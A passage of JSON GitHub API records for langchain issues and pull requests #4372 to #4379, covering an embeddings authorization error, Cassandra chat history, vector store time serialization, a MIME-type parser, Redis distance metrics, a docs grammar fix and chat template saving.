        "body": "### System Info\r\n\r\nlangchain 0.0.162\r\npython 3.8\r\nHuggingFace free tier server\r\n\r\n### Who can help?\r\n\r\n_No response_\r\n\r\n### Information\r\n\r\n- [x] The official example notebooks/scripts\r\n- [x] My own modified scripts\r\n\r\n### Related Components\r\n\r\n- [ ] LLMs/Chat Models\r\n- [X] Embedding Models\r\n- [ ] Prompts / Prompt Templates / Prompt Selectors\r\n- [ ] Output Parsers\r\n- [ ] Document Loaders\r\n- [ ] Vector Stores / Retrievers\r\n- [ ] Memory\r\n- [ ] Agents / Agent Executors\r\n- [ ] Tools / Toolkits\r\n- [ ] Chains\r\n- [ ] Callbacks/Tracing\r\n- [ ] Async\r\n\r\n### Reproduction\r\n\r\n```\r\nfrom langchain.embeddings import HuggingFaceEmbeddings\r\nembeddings = HuggingFaceEmbeddings()\r\n```\r\n\r\n```\r\n/user/.local/lib/python3.8/site-packages/huggingface_hub/utils/_errors.py\", line 259, in hf_raise_for_status\r\n    response.raise_for_status()\r\n  File \"/home/user/.local/lib/python3.8/site-packages/requests/models.py\", line 1021, in raise_for_status\r\n    raise HTTPError(http_error_msg, response=self)\r\nrequests.exceptions.HTTPError: 401 Client Error: Unauthorized for url: https://huggingface.co/api/models/sentence-transformers/all-mpnet-base-v2\r\n\r\nThe above exception was the direct cause of the following exception:\r\n\r\nTraceback (most recent call last):\r\n  File \"app.py\", line 2, in <module>\r\n    embeddings = HuggingFaceEmbeddings()\r\n  File \"/home/user/.local/lib/python3.8/site-packages/langchain/embeddings/huggingface.py\", line 54, in __init__\r\n    self.client = sentence_transformers.SentenceTransformer(\r\n  File \"/home/user/.local/lib/python3.8/site-packages/sentence_transformers/SentenceTransformer.py\", line 87, in __init__\r\n    snapshot_download(model_name_or_path,\r\n  File \"/home/user/.local/lib/python3.8/site-packages/sentence_transformers/util.py\", line 442, in snapshot_download\r\n    model_info = _api.model_info(repo_id=repo_id, revision=revision, token=token)\r\n  File \"/home/user/.local/lib/python3.8/site-packages/huggingface_hub/utils/_validators.py\", line 120, in _inner_fn\r\n    return fn(*args, **kwargs)\r\n  File \"/home/user/.local/lib/python3.8/site-packages/huggingface_hub/hf_api.py\", line 1604, in model_info\r\n    hf_raise_for_status(r)\r\n  File \"/home/user/.local/lib/python3.8/site-packages/huggingface_hub/utils/_errors.py\", line 291, in hf_raise_for_status\r\n    raise RepositoryNotFoundError(message, response) from e\r\nhuggingface_hub.utils._errors.RepositoryNotFoundError: 401 Client Error. (Request ID: Root=1-6459cb14-023db7f06244e0660677dfb9)\r\n```\r\n\r\n### Expected behavior\r\n\r\nSuccessfully creates an embeddings model.",
        "reactions": {
            "url": "https://api.github.com/repos/langchain-ai/langchain/issues/4379/reactions",
            "total_count": 2,
            "+1": 2,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4379/timeline",
        "performed_via_github_app": null,
        "state_reason": "completed"
    },
    {
        "url": "https://api.github.com/repos/langchain-ai/langchain/issues/4378",
        "repository_url": "https://api.github.com/repos/langchain-ai/langchain",
        "labels_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4378/labels{/name}",
        "comments_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4378/comments",
        "events_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4378/events",
        "html_url": "https://github.com/langchain-ai/langchain/pull/4378",
        "id": 1701298102,
        "node_id": "PR_kwDOIPDwls5QDjqh",
        "number": 4378,
        "title": "Cassandra support for chat history",
        "user": {
            "login": "jj701",
            "id": 129657162,
            "node_id": "U_kgDOB7ppSg",
            "avatar_url": "https://avatars.githubusercontent.com/u/129657162?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/jj701",
            "html_url": "https://github.com/jj701",
            "followers_url": "https://api.github.com/users/jj701/followers",
            "following_url": "https://api.github.com/users/jj701/following{/other_user}",
            "gists_url": "https://api.github.com/users/jj701/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/jj701/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/jj701/subscriptions",
            "organizations_url": "https://api.github.com/users/jj701/orgs",
            "repos_url": "https://api.github.com/users/jj701/repos",
            "events_url": "https://api.github.com/users/jj701/events{/privacy}",
            "received_events_url": "https://api.github.com/users/jj701/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 1,
        "created_at": "2023-05-09T04:19:54Z",
        "updated_at": "2023-05-17T20:21:00Z",
        "closed_at": "2023-05-16T04:12:48Z",
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/langchain-ai/langchain/pulls/4378",
            "html_url": "https://github.com/langchain-ai/langchain/pull/4378",
            "diff_url": "https://github.com/langchain-ai/langchain/pull/4378.diff",
            "patch_url": "https://github.com/langchain-ai/langchain/pull/4378.patch",
            "merged_at": "2023-05-16T04:12:48Z"
        },
        "body": "# Cassandra support for chat history\r\n\r\n### Description\r\n\r\n- Store chat messages in cassandra\r\n\r\n### Dependency\r\n\r\n- cassandra-driver - Python Module\r\n\r\n## Before submitting\r\n\r\n- Added Integration Test\r\n\r\n## Who can review?\r\n\r\n@hwchase17\r\n@agola11",
        "reactions": {
            "url": "https://api.github.com/repos/langchain-ai/langchain/issues/4378/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4378/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/langchain-ai/langchain/issues/4377",
        "repository_url": "https://api.github.com/repos/langchain-ai/langchain",
        "labels_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4377/labels{/name}",
        "comments_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4377/comments",
        "events_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4377/events",
        "html_url": "https://github.com/langchain-ai/langchain/issues/4377",
        "id": 1701213657,
        "node_id": "I_kwDOIPDwls5lZnXZ",
        "number": 4377,
        "title": "(De)Serializing memories in TimeWeightedVectorStore",
        "user": {
            "login": "EandrewJones",
            "id": 41238273,
            "node_id": "MDQ6VXNlcjQxMjM4Mjcz",
            "avatar_url": "https://avatars.githubusercontent.com/u/41238273?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/EandrewJones",
            "html_url": "https://github.com/EandrewJones",
            "followers_url": "https://api.github.com/users/EandrewJones/followers",
            "following_url": "https://api.github.com/users/EandrewJones/following{/other_user}",
            "gists_url": "https://api.github.com/users/EandrewJones/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/EandrewJones/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/EandrewJones/subscriptions",
            "organizations_url": "https://api.github.com/users/EandrewJones/orgs",
            "repos_url": "https://api.github.com/users/EandrewJones/repos",
            "events_url": "https://api.github.com/users/EandrewJones/events{/privacy}",
            "received_events_url": "https://api.github.com/users/EandrewJones/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 1,
        "created_at": "2023-05-09T02:40:31Z",
        "updated_at": "2023-09-10T16:20:03Z",
        "closed_at": "2023-09-10T16:20:02Z",
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "body": "### Feature request\r\n\r\nI propose refactoring the TimeWeightedVectorStore to use epoch milliseconds as the time format instead of directly passing in a python `datetime` object as the `created_at` and `last_accessed_at` fields.\r\n\r\nThe current implementation _does_ allow users to specify a current_time when adding documents, but on retrieval it always uses datetime.now() to rescore docs.\r\n\r\nAdding:\r\n```py\r\n def add_documents(self, documents: List[Document], **kwargs: Any) -> List[str]:\r\n        \"\"\"Add documents to vectorstore.\"\"\"\r\n        current_time = kwargs.get(\"current_time\", datetime.now())\r\n        # Avoid mutating input documents\r\n        dup_docs = [deepcopy(d) for d in documents]\r\n        for i, doc in enumerate(dup_docs):\r\n            if \"last_accessed_at\" not in doc.metadata:\r\n                doc.metadata[\"last_accessed_at\"] = current_time\r\n            if \"created_at\" not in doc.metadata:\r\n                doc.metadata[\"created_at\"] = current_time\r\n            doc.metadata[\"buffer_idx\"] = len(self.memory_stream) + i\r\n        self.memory_stream.extend(dup_docs)\r\n        return self.vectorstore.add_documents(dup_docs, **kwargs)\r\n```\r\n\r\nRetrieval:\r\n```py\r\n    def get_relevant_documents(self, query: str) -> List[Document]:\r\n        \"\"\"Return documents that are relevant to the query.\"\"\"\r\n        current_time = datetime.now()\r\n        docs_and_scores = {\r\n            doc.metadata[\"buffer_idx\"]: (doc, self.default_salience)\r\n            for doc in self.memory_stream[-self.k :]\r\n        }\r\n        # If a doc is considered salient, update the salience score\r\n        docs_and_scores.update(self.get_salient_docs(query))\r\n        rescored_docs = [\r\n            (doc, self._get_combined_score(doc, relevance, current_time))\r\n            for doc, relevance in docs_and_scores.values()\r\n        ]\r\n        rescored_docs.sort(key=lambda x: x[1], reverse=True)\r\n        result = []\r\n        # Ensure frequently accessed memories aren't forgotten\r\n        current_time = datetime.now()\r\n        for doc, _ in rescored_docs[: self.k]:\r\n            # TODO: Update vector store doc once `update` method is exposed.\r\n            buffered_doc = self.memory_stream[doc.metadata[\"buffer_idx\"]]\r\n            buffered_doc.metadata[\"last_accessed_at\"] = current_time\r\n            result.append(buffered_doc)\r\n        return result\r\n```\r\n\r\nWhat's the problem with this? `datetime.now()` is not JSON (de-)serializable.\r\n\r\n### Motivation\r\n\r\nWhile this class works fine in the example using a local FAISS vectorstore, it requires you to define  custom JSONEncoder and Decoders if you want to persist to/instantiate from local. It also doesn't work with the Redis Vectorstore because that serializes to JSON before storing the docs.\r\n\r\n### Your contribution\r\n\r\nThere are a couple options to fix this, the least invasive of which is:\r\n- use epoch ms as the fixed format for storing time values b/c it's nice for serDe\r\n- convert the times into python datetime objects in the `_get_hours_passed` function\r\n\r\n This function is the only place where the timestamps _need_ to be python datetime objects. The alternative fixes involve expanding the API surface area of any vectorstore where JSON encoders and decoders are needed to solve this problem. No one likes prop drilling.",
        "reactions": {
            "url": "https://api.github.com/repos/langchain-ai/langchain/issues/4377/reactions",
            "total_count": 1,
            "+1": 0,
            "-1": 0,
            "laugh": 1,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4377/timeline",
        "performed_via_github_app": null,
        "state_reason": "not_planned"
    },
    {
        "url": "https://api.github.com/repos/langchain-ai/langchain/issues/4376",
        "repository_url": "https://api.github.com/repos/langchain-ai/langchain",
        "labels_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4376/labels{/name}",
        "comments_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4376/comments",
        "events_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4376/events",
        "html_url": "https://github.com/langchain-ai/langchain/pull/4376",
        "id": 1701204212,
        "node_id": "PR_kwDOIPDwls5QDPcn",
        "number": 4376,
        "title": "Add MimeType based parser",
        "user": {
            "login": "eyurtsev",
            "id": 3205522,
            "node_id": "MDQ6VXNlcjMyMDU1MjI=",
            "avatar_url": "https://avatars.githubusercontent.com/u/3205522?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/eyurtsev",
            "html_url": "https://github.com/eyurtsev",
            "followers_url": "https://api.github.com/users/eyurtsev/followers",
            "following_url": "https://api.github.com/users/eyurtsev/following{/other_user}",
            "gists_url": "https://api.github.com/users/eyurtsev/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/eyurtsev/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/eyurtsev/subscriptions",
            "organizations_url": "https://api.github.com/users/eyurtsev/orgs",
            "repos_url": "https://api.github.com/users/eyurtsev/repos",
            "events_url": "https://api.github.com/users/eyurtsev/events{/privacy}",
            "received_events_url": "https://api.github.com/users/eyurtsev/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 0,
        "created_at": "2023-05-09T02:26:16Z",
        "updated_at": "2023-05-09T14:22:58Z",
        "closed_at": "2023-05-09T14:22:57Z",
        "author_association": "COLLABORATOR",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/langchain-ai/langchain/pulls/4376",
            "html_url": "https://github.com/langchain-ai/langchain/pull/4376",
            "diff_url": "https://github.com/langchain-ai/langchain/pull/4376.diff",
            "patch_url": "https://github.com/langchain-ai/langchain/pull/4376.patch",
            "merged_at": "2023-05-09T14:22:56Z"
        },
        "body": "# Add MimeType Based Parser\n\nThis PR adds a MimeType Based Parser. The parser inspects the mime-type of the\nblob it is parsing and based on the mime-type can delegate to the sub parser.\n\n## Before submitting\n\nWaiting on adding notebooks until more implementations are landed. \n\n## Who can review?\n\nCommunity members can review the PR once tests pass. Tag maintainers/contributors who might be interested:\n\n\n@hwchase17\n@vowelparrot\n",
        "reactions": {
            "url": "https://api.github.com/repos/langchain-ai/langchain/issues/4376/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4376/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/langchain-ai/langchain/issues/4375",
        "repository_url": "https://api.github.com/repos/langchain-ai/langchain",
        "labels_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4375/labels{/name}",
        "comments_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4375/comments",
        "events_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4375/events",
        "html_url": "https://github.com/langchain-ai/langchain/pull/4375",
        "id": 1701196323,
        "node_id": "PR_kwDOIPDwls5QDNx-",
        "number": 4375,
        "title": "parameterized distance metrics; lint; format; tests",
        "user": {
            "login": "EandrewJones",
            "id": 41238273,
            "node_id": "MDQ6VXNlcjQxMjM4Mjcz",
            "avatar_url": "https://avatars.githubusercontent.com/u/41238273?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/EandrewJones",
            "html_url": "https://github.com/EandrewJones",
            "followers_url": "https://api.github.com/users/EandrewJones/followers",
            "following_url": "https://api.github.com/users/EandrewJones/following{/other_user}",
            "gists_url": "https://api.github.com/users/EandrewJones/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/EandrewJones/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/EandrewJones/subscriptions",
            "organizations_url": "https://api.github.com/users/EandrewJones/orgs",
            "repos_url": "https://api.github.com/users/EandrewJones/repos",
            "events_url": "https://api.github.com/users/EandrewJones/events{/privacy}",
            "received_events_url": "https://api.github.com/users/EandrewJones/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 5454193895,
                "node_id": "LA_kwDOIPDwls8AAAABRRhk5w",
                "url": "https://api.github.com/repos/langchain-ai/langchain/labels/lgtm",
                "name": "lgtm",
                "color": "0E8A16",
                "default": false,
                "description": ""
            }
        ],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 1,
        "created_at": "2023-05-09T02:14:24Z",
        "updated_at": "2023-05-11T07:20:02Z",
        "closed_at": "2023-05-11T07:20:02Z",
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/langchain-ai/langchain/pulls/4375",
            "html_url": "https://github.com/langchain-ai/langchain/pull/4375",
            "diff_url": "https://github.com/langchain-ai/langchain/pull/4375.diff",
            "patch_url": "https://github.com/langchain-ai/langchain/pull/4375.patch",
            "merged_at": "2023-05-11T07:20:02Z"
        },
        "body": "# Parameterize Redis vectorstore index\r\n\r\nRedis vectorstore allows for three different distance metrics: `L2` (flat L2), `COSINE`, and `IP` (inner product). Currently, the  `Redis._create_index` method hard codes the distance metric to COSINE.\r\n\r\nI've parameterized this as an argument in the `Redis.from_texts` method -- pretty simple.\r\n\r\nFixes #4368 \r\n\r\n## Before submitting\r\n\r\nI've added an integration test showing indexes can be instantiated with all three values in the `REDIS_DISTANCE_METRICS` literal. An example notebook seemed overkill here. Normal API documentation would be more appropriate, but no standards are in place for that yet.\r\n\r\n## Who can review?\r\n\r\nNot sure who's responsible for the vectorstore module... Maybe @eyurtsev / @hwchase17 / @agola11 ?\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/langchain-ai/langchain/issues/4375/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4375/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/langchain-ai/langchain/issues/4374",
        "repository_url": "https://api.github.com/repos/langchain-ai/langchain",
        "labels_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4374/labels{/name}",
        "comments_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4374/comments",
        "events_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4374/events",
        "html_url": "https://github.com/langchain-ai/langchain/pull/4374",
        "id": 1701186237,
        "node_id": "PR_kwDOIPDwls5QDLr8",
        "number": 4374,
        "title": "Add distance metric to redis vectorstore index",
        "user": {
            "login": "EandrewJones",
            "id": 41238273,
            "node_id": "MDQ6VXNlcjQxMjM4Mjcz",
            "avatar_url": "https://avatars.githubusercontent.com/u/41238273?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/EandrewJones",
            "html_url": "https://github.com/EandrewJones",
            "followers_url": "https://api.github.com/users/EandrewJones/followers",
            "following_url": "https://api.github.com/users/EandrewJones/following{/other_user}",
            "gists_url": "https://api.github.com/users/EandrewJones/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/EandrewJones/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/EandrewJones/subscriptions",
            "organizations_url": "https://api.github.com/users/EandrewJones/orgs",
            "repos_url": "https://api.github.com/users/EandrewJones/repos",
            "events_url": "https://api.github.com/users/EandrewJones/events{/privacy}",
            "received_events_url": "https://api.github.com/users/EandrewJones/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 0,
        "created_at": "2023-05-09T02:00:34Z",
        "updated_at": "2023-05-09T02:08:16Z",
        "closed_at": "2023-05-09T02:08:01Z",
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/langchain-ai/langchain/pulls/4374",
            "html_url": "https://github.com/langchain-ai/langchain/pull/4374",
            "diff_url": "https://github.com/langchain-ai/langchain/pull/4374.diff",
            "patch_url": "https://github.com/langchain-ai/langchain/pull/4374.patch",
            "merged_at": null
        },
        "body": "# Parameterize Redis vectorstore index\r\n\r\nRedis vectorstore allows for three different distance metrics: `L2` (flat L2), `COSINE`, and `IP` (inner product). Currently, the  `Redis._create_index` method hard codes the distance metric to COSINE.\r\n\r\nI've parameterized this as an argument in the `Redis.from_texts` method -- pretty simple.\r\n\r\nFixes #4368 \r\n\r\n## Before submitting\r\n\r\nI've added an integration test showing indexes can be instantiated with all three values in the `REDIS_DISTANCE_METRICS` literal. An example notebook seemed overkill here. Normal API documentation would be more appropriate, but no standards are in place for that yet.\r\n\r\n## Who can review?\r\n\r\nNot sure who's responsible for the vectorstore module... Maybe @eyurtsev / @hwchase17 / @agola11 ?\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/langchain-ai/langchain/issues/4374/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4374/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/langchain-ai/langchain/issues/4373",
        "repository_url": "https://api.github.com/repos/langchain-ai/langchain",
        "labels_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4373/labels{/name}",
        "comments_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4373/comments",
        "events_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4373/events",
        "html_url": "https://github.com/langchain-ai/langchain/pull/4373",
        "id": 1701181594,
        "node_id": "PR_kwDOIPDwls5QDKt7",
        "number": 4373,
        "title": "Fix grammar in Text Splitters docs",
        "user": {
            "login": "bioerrorlog",
            "id": 51422347,
            "node_id": "MDQ6VXNlcjUxNDIyMzQ3",
            "avatar_url": "https://avatars.githubusercontent.com/u/51422347?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/bioerrorlog",
            "html_url": "https://github.com/bioerrorlog",
            "followers_url": "https://api.github.com/users/bioerrorlog/followers",
            "following_url": "https://api.github.com/users/bioerrorlog/following{/other_user}",
            "gists_url": "https://api.github.com/users/bioerrorlog/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/bioerrorlog/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/bioerrorlog/subscriptions",
            "organizations_url": "https://api.github.com/users/bioerrorlog/orgs",
            "repos_url": "https://api.github.com/users/bioerrorlog/repos",
            "events_url": "https://api.github.com/users/bioerrorlog/events{/privacy}",
            "received_events_url": "https://api.github.com/users/bioerrorlog/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 1,
        "created_at": "2023-05-09T01:53:46Z",
        "updated_at": "2023-05-09T03:05:33Z",
        "closed_at": "2023-05-09T02:38:40Z",
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/langchain-ai/langchain/pulls/4373",
            "html_url": "https://github.com/langchain-ai/langchain/pull/4373",
            "diff_url": "https://github.com/langchain-ai/langchain/pull/4373.diff",
            "patch_url": "https://github.com/langchain-ai/langchain/pull/4373.patch",
            "merged_at": "2023-05-09T02:38:40Z"
        },
        "body": "# Fix grammar in Text Splitters docs\r\n\r\nJust a small fix of grammar in the documentation:\r\n\r\n\"That means there two different axes\" -> \"That means there are two different axes\"\r\n<!--\r\nThank you for contributing to LangChain! Your PR will appear in our next release under the title you set. Please make sure it highlights your valuable contribution.\r\n\r\nReplace this with a description of the change, the issue it fixes (if applicable), and relevant context. List any dependencies required for this change.\r\n\r\nAfter you're done, someone will review your PR. They may suggest improvements. If no one reviews your PR within a few days, feel free to @-mention the same people again, as notifications can get lost.\r\n-->\r\n\r\n<!-- Remove if not applicable -->\r\n\r\n\r\n<!-- For a quicker response, figure out the right person to tag with @\r\n\r\n        @hwchase17 - project lead\r\n\r\n        Tracing / Callbacks\r\n        - @agola11\r\n\r\n        Async\r\n        - @agola11\r\n\r\n        DataLoader Abstractions\r\n        - @eyurtsev\r\n\r\n        LLM/Chat Wrappers\r\n        - @hwchase17\r\n        - @agola11\r\n\r\n        Tools / Toolkits\r\n        - @vowelparrot\r\n -->\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/langchain-ai/langchain/issues/4373/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4373/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/langchain-ai/langchain/issues/4372",
        "repository_url": "https://api.github.com/repos/langchain-ai/langchain",
        "labels_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4372/labels{/name}",
        "comments_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4372/comments",
        "events_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4372/events",
        "html_url": "https://github.com/langchain-ai/langchain/pull/4372",
        "id": 1701166499,
        "node_id": "PR_kwDOIPDwls5QDHWS",
        "number": 4372,
        "title": "Serialize chat template",
        "user": {
            "login": "SalehHindi",
            "id": 15721377,
            "node_id": "MDQ6VXNlcjE1NzIxMzc3",
            "avatar_url": "https://avatars.githubusercontent.com/u/15721377?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/SalehHindi",
            "html_url": "https://github.com/SalehHindi",
            "followers_url": "https://api.github.com/users/SalehHindi/followers",
            "following_url": "https://api.github.com/users/SalehHindi/following{/other_user}",
            "gists_url": "https://api.github.com/users/SalehHindi/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/SalehHindi/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/SalehHindi/subscriptions",
            "organizations_url": "https://api.github.com/users/SalehHindi/orgs",
            "repos_url": "https://api.github.com/users/SalehHindi/repos",
            "events_url": "https://api.github.com/users/SalehHindi/events{/privacy}",
            "received_events_url": "https://api.github.com/users/SalehHindi/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 5680700873,
                "node_id": "LA_kwDOIPDwls8AAAABUpidyQ",
                "url": "https://api.github.com/repos/langchain-ai/langchain/labels/auto:improvement",
                "name": "auto:improvement",
                "color": "FBCA04",
                "default": false,
                "description": "Medium size change to existing code to handle new use-cases"
            }
        ],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 2,
        "created_at": "2023-05-09T01:40:18Z",
        "updated_at": "2023-08-11T21:40:47Z",
        "closed_at": "2023-08-11T21:40:46Z",
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/langchain-ai/langchain/pulls/4372",
            "html_url": "https://github.com/langchain-ai/langchain/pull/4372",
            "diff_url": "https://github.com/langchain-ai/langchain/pull/4372.diff",
            "patch_url": "https://github.com/langchain-ai/langchain/pull/4372.patch",
            "merged_at": null
        },
        "body": "Currently the .save() method does not work for `ChatPromptTemplate`. I am implementing it here. The goal is to save/load chat template messages. Had to add in the `role` to each message. Please let me know if there is a better way to store the role.\r\n\r\nThis is what a chatTemplate.save() looks like when saved to json after this change:\r\n\r\n```\r\n{\r\n    \"input_variables\": [\r\n        \"text\",\r\n        \"output_language\",\r\n        \"input_language\"\r\n    ],\r\n    \"output_parser\": null,\r\n    \"partial_variables\": {},\r\n    \"messages\": [\r\n        {\r\n            \"prompt\": {\r\n                \"input_variables\": [\r\n                    \"input_language\",\r\n                    \"output_language\"\r\n                ],\r\n                \"output_parser\": null,\r\n                \"partial_variables\": {},\r\n                \"template\": \"You are a helpful assistant that translates {input_language} to {output_language}.\",\r\n                \"template_format\": \"f-string\",\r\n                \"validate_template\": true,\r\n                \"_type\": \"prompt\",\r\n                \"role\": \"system\"\r\n            },\r\n            \"additional_kwargs\": {}\r\n        },\r\n        {\r\n            \"prompt\": {\r\n                \"input_variables\": [\r\n                    \"text\"\r\n                ],\r\n                \"output_parser\": null,\r\n                \"partial_variables\": {},\r\n                \"template\": \"{text}\",\r\n                \"template_format\": \"f-string\",\r\n                \"validate_template\": true,\r\n                \"_type\": \"prompt\",\r\n                \"role\": \"human\"\r\n            },\r\n            \"additional_kwargs\": {}\r\n        }\r\n    ],\r\n    \"_type\": \"chatPrompt\"\r\n}\r\n```\r\n\r\n<!--\r\nThank you for contributing to LangChain! Your PR will appear in our next release under the title you set. Please make sure it highlights your valuable contribution.\r\n\r\nReplace this with a description of the change, the issue it fixes (if applicable), and relevant context. List any dependencies required for this change.\r\n\r\nAfter you're done, someone will review your PR. They may suggest improvements. If no one reviews your PR within a few days, feel free to @-mention the same people again, as notifications can get lost.\r\n-->\r\n\r\n<!-- Remove if not applicable -->\r\n\r\nFixes # (issue)\r\n\r\n## Before submitting\r\n\r\n<!-- If you're adding a new integration, include an integration test and an example notebook showing its use! -->\r\n\r\n## Who can review?\r\n\r\nCommunity members can review the PR once tests pass. Tag maintainers/contributors who might be interested:\r\n\r\n<!-- For a quicker response, figure out the right person to tag with @\r\n\r\n        @hwchase17 - project lead\r\n\r\n        Tracing / Callbacks\r\n        - @agola11\r\n\r\n        Async\r\n        - @agola11\r\n\r\n        DataLoader Abstractions\r\n        - @eyurtsev\r\n\r\n        LLM/Chat Wrappers\r\n        - @hwchase17\r\n        - @agola11\r\n\r\n        Tools / Toolkits\r\n        - @vowelparrot\r\n -->\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/langchain-ai/langchain/issues/4372/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4372/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/langchain-ai/langchain/issues/4371",
        "repository_url": "https://api.github.com/repos/langchain-ai/langchain",
        "labels_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4371/labels{/name}",
        "comments_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4371/comments",
